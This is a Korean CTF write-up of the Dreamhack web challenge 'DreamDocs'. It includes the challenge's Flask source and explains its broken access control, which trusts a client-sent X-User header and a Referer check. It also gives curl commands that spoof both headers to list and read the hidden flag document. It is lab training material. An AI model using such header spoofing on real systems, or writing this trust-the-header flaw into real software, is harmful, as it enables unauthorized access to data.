**문제 설명**

**Description
Introducing DreamDocs: a platform for browsing docs!**

<img width="1431" height="1624" alt="image (18)" src="https://github.com/user-attachments/assets/dacc2652-361d-4899-8ce7-fa1d19213c67" />


문제화면이다.

- app.py
    
```python
    from flask import Flask, render_template, request, jsonify, abort
    import os
    import random
    
    app = Flask(__name__)
    app.secret_key = os.urandom(32)
    
    FLAG = open('flag.txt', 'r').read().strip()
    
    flag_doc_id = random.randint(100, 999)
    
    documents = {
        flag_doc_id: {
            'title': 'Confidential Report - Access Restricted',
            'content': f'This is a confidential internal document.\n\nDocument ID: {flag_doc_id}\nClassification: TOP SECRET\n\n<!-- FLAG: {FLAG} -->\n\nThis document contains sensitive information and should only be accessed by authorized personnel.',
            'classification': 'confidential',
            'author': 'System Administrator'
        }
    }
    
    for i in range(1000):
        if i not in documents:
            uid = random.randint(0, 9)
            documents[i] = {
                'title': f'Document #{i:03d}',
                'content': f'This is document number {i}.\n\nContent: Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.\n\nDocument ID: {i}\nCreated: 2025-01-{(i % 28) + 1:02d}\nAuthor: User{uid}',
                'classification': 'public' if random.randint(0, 2) == 0 else 'internal',
                'author': f'User{uid}'
            }
    
    @app.route('/')
    def index():
        return render_template('index.html')
    
    @app.route('/share')
    def share():
        return render_template('share.html')
    
    @app.route('/doc/<int:doc_id>')
    def view_document(doc_id):
        referer = request.headers.get('Referer', '')
        user_level = request.headers.get('X-User', 'guest')
    
        if doc_id < 0 or doc_id >= 1000:
            abort(404)
        
        if doc_id not in documents:
            abort(404)
        
        document = documents[doc_id]
    
        if '/share' not in referer:
            return render_template('error.html', 
                message="Access denied. Documents can only be accessed from the share page."), 403
        
        if document['classification'] == 'confidential':
            if user_level != 'admin':
                return render_template('error.html', 
                    message="Insufficient privileges. Administrator access required."), 403
        
        elif document['classification'] == 'internal':
            if user_level == 'guest':
                return render_template('error.html', 
                    message="Internal documents require user authentication."), 401
        
        return render_template('document.html', doc=document, doc_id=doc_id)
    
    @app.route('/api/docs')
    def list_docs():
        SHOW_COUNT = 15
        user_level = request.headers.get('X-User', 'guest')
        visible_docs = []
        
        for doc_id, doc in documents.items():
            if doc['classification'] == 'public':
                visible_docs.append({'id': doc_id, 'title': doc['title'], 'classification': doc['classification']})
            elif doc['classification'] == 'internal' and user_level != 'guest':
                visible_docs.append({'id': doc_id, 'title': doc['title'], 'classification': doc['classification']})
            elif doc['classification'] == 'confidential' and user_level == 'admin':
                visible_docs.append({'id': doc_id, 'title': doc['title'], 'classification': doc['classification']})
            if len(visible_docs) >= SHOW_COUNT:
                break
        
        return jsonify(visible_docs)
    
    if __name__ == '__main__':
        app.run(host='0.0.0.0', port=8000, debug=False)
```
    

소스 코드에서 인증 우회를 할 수 있도록 하는 코드가 있다.

```c
user_level = request.headers.get('X-User', 'guest')
```

세션/쿠키 기반 인증이 아니라 클라이언트가 보내는 헤더값을 그대로 신뢰한다.
그래서 그냥 요청 헤더에 X-User: admin을 추가하면 admin 권한을 획득할 수 있다.

또한

```c
documents = {
    flag_doc_id: { ... },  
}
for i in range(1000):
    ...
```

여기에서 flag_doc_id가 가장 먼저 삽입됐기 때문에 list_docs()에서 document.items()를 순회할 때 항상 첫 번째로 검사된다.

X-User: admin으로 요청하면 confidential 조건도 통과되니까 SHOW_COUNT=15에 걸리기 전에 flag문서가 리스트 맨 앞에 포함되어 id가 그대로 노출된다.

익스 짜보자 난 curl을 사용했다.

flag 문서 ID를 찾아보기 위해

```c
curl -s http://host3.dreamhack.games:22190/api/docs -H "X-User: admin" | python3 -m json.tool
```

<img width="1006" height="239" alt="image (19)" src="https://github.com/user-attachments/assets/bae80d17-fd43-400e-becc-98b3270255d6" />


id가 656인 걸 알아냈다.

```c
curl -s http://host3.dreamhack.games:22190/doc/656 \
  -H "Referer: http://host3.dreamhack.games:22190/share" \
  -H "X-User: admin"
```

를 해주면

코드 사이에서 

- flag를 획득할 수 있다.
    
<img width="952" height="178" alt="image (20)" src="https://github.com/user-attachments/assets/2e95ec35-3f09-4ca5-b300-38baf6b40588" />
